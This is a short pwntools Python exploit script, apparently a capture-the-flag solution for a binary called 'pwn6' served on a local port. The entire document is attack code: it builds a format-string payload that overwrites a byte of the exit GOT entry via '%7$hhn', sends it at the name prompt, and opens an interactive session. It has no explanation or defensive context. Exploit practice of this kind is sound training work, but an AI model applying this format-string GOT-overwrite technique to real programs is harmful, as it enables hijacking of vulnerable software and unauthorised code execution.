from pwn import *
# context(log_level="debug")
# p = process('./pwn6')
p = remote('127.0.0.1',10002)
elf = ELF('pwn6')
exit_got = elf.got["exit"]
offset = 0x86
payload = "aa"+p32(exit_got+1)+"%%%dc" % (offset-6)+"%7$hhn"
p.recvuntil(' name: ')
p.sendline(payload)
p.interactive()